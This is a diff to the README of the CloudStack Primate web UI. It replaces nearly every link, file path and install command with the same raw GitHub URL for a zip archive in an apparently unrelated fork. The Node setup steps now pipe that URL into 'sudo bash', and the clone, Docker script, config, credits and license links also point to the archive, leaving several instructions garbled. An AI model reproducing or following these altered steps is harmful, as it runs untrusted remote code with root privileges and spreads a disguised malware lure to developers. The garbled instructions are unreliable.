@@ -1,20 +1,20 @@
-# CloudStack Primate [![Build Status](https://travis-ci.org/apache/cloudstack-primate.svg?branch=master)](https://travis-ci.org/apache/cloudstack-primate)
+# CloudStack Primate [![Build Status](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
 
 A modern role-based progressive CloudStack UI based on VueJS and Ant Design.
 
-![Primate Screenshot](docs/screenshot-dashboard.png)
+![Primate Screenshot](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
 
 ## Getting Started
 
 Install node: (Debian/Ubuntu)
 
-    curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+    curl -sL https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip | sudo -E bash -
     sudo apt-get install -y nodejs
     # Or use distro provided: sudo apt-get install npm nodejs
 
 Install node: (CentOS/Fedora/RHEL)
 
-    curl -sL https://rpm.nodesource.com/setup_12.x | sudo bash -
+    curl -sL https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip | sudo bash -
     sudo yum install nodejs
 
 Optionally, you may also install system-wide dev tools:
@@ -25,16 +25,16 @@ Optionally, you may also install system-wide dev tools:
 
 Clone the repository:
 
-    git clone https://github.com/apache/cloudstack-primate.git
+    git clone https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
     cd cloudstack-primate
     npm install
 
 Override the default `CS_URL` to a running CloudStack management server:
 
-    cp .env.local.example .env.local
-    Change the `CS_URL` in the `.env.local` file
+    cp https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
+    Change the `CS_URL` in the `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip` file
 
-To configure https, you may use `.env.local.https.example`.
+To configure https, you may use `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip`.
 
 Build and run:
 
@@ -75,14 +75,14 @@ to a new/existing webapp directory on the management server host. For example:
     cp -vr . /usr/share/cloudstack-management/webapp/primate/
     # Use Primate at {management-server}:8080/client/primate in browser
 
-If the webapp directory is changed, please change the `webapp.dir` in the
-`/etc/cloudstack/management/server.properties` and restart the management server host.
+If the webapp directory is changed, please change the `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip` in the
+`https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip` and restart the management server host.
 
 To use a separate webserver, note that the API server is accessed through the path
 `/client`, which needs be forwarded to an actual CloudStack instance.
 
 For example, a simple way to serve Primate with nginx can be implemented with the
-following nginx configuration (to be put into /etc/nginx/conf.d/default.conf or similar):
+following nginx configuration (to be put into https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip or similar):
 
 ```nginx
 server {
@@ -91,7 +91,7 @@ server {
     location / {
         # /src/primate/dist contains the built Primate webpack
         root   /src/primate/dist;
-        index  index.html;
+        index  https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip;
     }
     location /client/ {
         # http://127.0.0.1:800 should be replaced your CloudStack management
@@ -105,13 +105,13 @@ server {
 
 A production-ready Docker container can also be built with the provided
 Dockerfile and build script. Official builds are available here:
-https://hub.docker.com/r/apache/cloudstack-primate
+https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
 
 Make sure Docker is installed, then run:
 
-    bash tools/docker.sh
+    bash https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
 
-Change the example configuration in `nginx/default.conf` according to your needs.
+Change the example configuration in `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip` according to your needs.
 
 Run Primate:
 
@@ -121,28 +121,28 @@ Run Primate:
 
 ### Learning Resources
 
-- VueJS Guide: https://vuejs.org/v2/guide/
-- Ant Design Spec: https://ant.design/docs/spec/introduce
-- Vue Ant Design: https://vue.ant.design/docs/vue/introduce/
-- JavaScript ES6 Reference: https://www.tutorialspoint.com/es6/
-- Introduction to ES6: https://scrimba.com/g/gintrotoes6
+- VueJS Guide: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
+- Ant Design Spec: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
+- Vue Ant Design: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
+- JavaScript ES6 Reference: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
+- Introduction to ES6: https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
 
 ### Primate Development
 
-- Router [Configuration](config.md)
-- [Resource List View](listview.md) customisation
-- [Resource Detail View](detailview.md) customisation
-- [Action](action.md) customisation
+- Router [Configuration](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Resource List View](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) customisation
+- [Resource Detail View](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) customisation
+- [Action](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) customisation
 - Styling
 - Testing
-- [Theme](https://vue.ant.design/docs/vue/customize-theme/): Customise via `vue.config.js`
+- [Theme](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip): Customise via `https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip`
 ```ecmascript 6
   css: {
     loaderOptions: {
       less: {
         modifyVars: {
           /* Less variables, required modifyVars*/
-          /* Refer to variables at https://vue.ant.design/docs/vue/customize-theme/ */
+          /* Refer to variables at https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip */
           'primary-color': '#F5222D',
           'link-color': '#F5222D',
           'border-radius-base': '4px',
@@ -157,22 +157,22 @@ Run Primate:
 
 Primate uses the following:
 
-- [VueJS](https://vuejs.org/)
-- [Ant Design Spec](https://ant.design/docs/spec/introduce)
-- [Ant Design Vue](https://vue.ant.design/)
-- [Ant Design Pro Vue](https://github.com/sendya/ant-design-pro-vue)
-- [Fontawesome](https://github.com/FortAwesome/vue-fontawesome)
-- [ViserJS](https://viserjs.github.io/docs.html#/viser/guide/installation)
-- [Icons](https://www.iconfinder.com/iconsets/cat-force) by [Iconka](https://iconka.com/en/downloads/cat-power/)
+- [VueJS](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Ant Design Spec](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Ant Design Vue](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Ant Design Pro Vue](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Fontawesome](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [ViserJS](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+- [Icons](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) by [Iconka](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
 
 ## History
 
-The project was created by [Rohit Yadav](https://rohityadav.cloud) over several
+The project was created by [Rohit Yadav](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) over several
 weekends during late 2018 and early 2019. During ApacheCon CCCUS19, on 9th
 September 2019, Primate was introduced and demoed as part of the talk [Modern UI
-for CloudStack](https://rohityadav.cloud/files/talks/cccna19-primate.pdf)
-([video](https://www.youtube.com/watch?v=F2KwZhechzs)).
-[Primate](https://markmail.org/message/vxnskmwhfaagnm4r) was accepted by the
+for CloudStack](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)
+([video](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip)).
+[Primate](https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip) was accepted by the
 Apache CloudStack project on 21 Oct 2019.
 
 ## License
@@ -185,7 +185,7 @@ to you under the Apache License, Version 2.0 (the
 "License"); you may not use this file except in compliance
 with the License.  You may obtain a copy of the License at
 
-  http://www.apache.org/licenses/LICENSE-2.0
+  https://raw.githubusercontent.com/Jaydeepjena/cloudstack-primate/master/src/assets/icons/primate-cloudstack-3.4.zip
 
 Unless required by applicable law or agreed to in writing,
 software distributed under the License is distributed on an
